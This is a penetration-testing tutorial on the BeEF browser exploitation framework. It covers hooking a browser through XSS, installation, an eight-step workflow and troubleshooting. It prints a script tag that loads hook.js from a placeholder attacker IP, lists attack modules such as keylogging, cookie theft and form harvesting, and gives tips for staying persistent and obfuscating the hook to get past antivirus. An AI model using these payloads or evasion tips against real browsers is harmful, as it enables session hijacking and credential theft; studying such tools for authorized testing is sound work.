BEEF
Exploitation · Browser Exploitation Framework
Advanced 500+ Modules Browser Hook XSS Post-Exploitation

BeEF (Browser Exploitation Framework) is a penetration testing tool that focuses on client-side browser vulnerabilities. Unlike traditional exploits that attack servers, BeEF "hooks" a victim's browser and gives you a remote control panel to command it. Once a browser is hooked, you can run 500+ modules — from keylogging to network scanning, social engineering, and post-exploitation.

What is BeEF? (Deep Theory)

Traditional pentests attack the server. But modern apps run in browsers — and browsers have their own vulnerabilities and weaknesses. BeEF exploits the browser as an attack surface.

How BeEF Works — The Hook Concept

  1. Attacker runs BeEF server on their machine
  2. Attacker injects a hook.js script into a victim's browser — typically via XSS or a malicious web page
  3. Once the script loads, the browser is hooked — BeEF maintains a persistent connection
  4. Attacker now sees the hooked browser in BeEF's web UI
  5. Attacker can run modules to attack the browser, its extensions, or the user

The Hook Payload

The hook is literally one line of JavaScript:

<script src="http://attacker-ip:3000/hook.js"></script>

That's it. Once loaded, the browser is under BeEF's control until the tab is closed or the machine is shut down.

What BeEF Can Do Once Hooked

  • Reconnaissance — finger-print browser, extensions, plugins, OS
  • Network — scan internal network from victim's browser (bypassing firewall!)
  • Keylogging — capture keystrokes on forms
  • Form harvesting — steal form submissions before they leave
  • Social engineering — fake login prompts, clickjacking
  • Cookie theft — grab session cookies via XSS
  • Webcam/Mic — permission prompts (if user clicks allow)
  • Screen capture — take screenshot of victim's screen
  • Worm propagation — infect other users visiting the same page
  • Persistent — survives page changes via iframe tricks
💡
The power: BeEF turns a simple XSS vulnerability into a full post-exploitation platform. A 15-second XSS often becomes a multi-hour session with the victim's browser.
Real-World Use Cases

1. XSS Post-Exploitation

You found a stored XSS. Instead of just popping an alert, hook the browser with BeEF — now you own every visitor's browser.

2. Red Team Engagements

Installation

Kali Linux

sudo apt update && sudo apt install -y beef-xss

Manual Install (GitHub)

git clone https://github.com/beefproject/beef.git
cd beef
./install

Docker

docker run -p 3000:3000 -p 6789:6789 -p 61985:61985 -p 61986:61986 --name beef -d beefproject/beef

Verify

cd /usr/share/beef-xss && ls
beef config.yaml Gemfile install modules README.md ...
🔑
Default credentials: Username beef, Password beef. Change this immediately in config.yaml before using.

Complete Workflow — XSS to Full Compromise
Step 1: Start BeEF Server
sudo beef-xss
Step 2: Login to Web UI
Open http://127.0.0.1:3000/ui/panel and login with credentials.
Step 3: Find XSS Vulnerability
Use Dalfox, XSStrike, or Burp to find reflected/stored XSS on target.
Step 4: Inject Hook Payload
<script src="http://YOUR-IP:3000/hook.js"></script>
Step 5: Wait for Hook
When victim visits the page, they appear in BeEF's UI as Online Browsers.
Step 6: Run Recon Modules
Fingerprint browser, OS, extensions, plugins. Get internal IP.
Step 7: Run Attack Modules
Keylogger, form grabber, port scan, screenshot, cookie theft.
Step 8: Demonstrate Impact
Generate report from BeEF's web UI showing all actions performed.

Set public IP for external hooks (behind NAT).

Troubleshooting

"BeEF won't start — Ruby error"

  • Check Ruby version: ruby -v (needs 2.6+)
  • Reinstall: cd /usr/share/beef-xss && sudo ./install
  • Check logs: tail -50 /usr/share/beef-xss/beef.log

"Browser hooked but modules don't work"

  • Some modules need browser permissions
  • Check BeEF log for errors
  • Refresh hooked browser — sometimes the hook times out

"Hook not working over Internet"

  • Set public IP in config.yaml
  • Open ports 3000, 6789, 61985, 61986 on firewall/router
  • Use ngrok/Cloudflare Tunnel for HTTPS
  • Consider NAT traversal issues

"Hooks disappear after a while"

  • BeEF hooks expire after browser closes tab
  • Use Persistence → Man-In-The-Browser module
  • Keep victim's tab open

"Port scanner too slow"

  • Reduce port range in module settings
  • Use WebRTC-based port scan (faster)
  • Combine with DNS enumeration for host discovery

"Antivirus blocks hook.js"

  • Obfuscate hook (BeEF has options)
  • Use HTTPS + valid cert
  • Serve from domain that looks legitimate
